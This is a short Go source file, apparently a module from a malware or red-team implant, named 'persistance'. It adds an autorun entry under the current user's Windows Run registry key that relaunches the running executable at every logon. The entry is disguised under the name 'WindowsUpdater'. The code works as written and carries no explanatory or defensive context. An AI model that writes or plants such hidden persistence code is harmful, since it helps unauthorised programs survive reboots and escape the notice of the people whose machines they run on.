package persistance

import (
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
)

func closeRegistry(k registry.Key) error {
	err := k.Close()
	if err != nil {
		return err
	}
	return nil
}

func RegistryAutoRun() error {
	regPath := `Software\Microsoft\Windows\CurrentVersion\Run`

	log.Printf("Trying to add a value to the registry %s ...", regPath)

	k, err := registry.OpenKey(registry.CURRENT_USER, regPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	err = k.SetStringValue(`WindowsUpdater`, `cmd.exe `+os.Args[0])
	if err != nil {
		err := closeRegistry(k)
		if err != nil {
			return err
		}
		return err
	}

	err = closeRegistry(k)
	if err != nil {
		return err
	}
	log.Println(`Success! Value added to the registry`)

	return nil
}
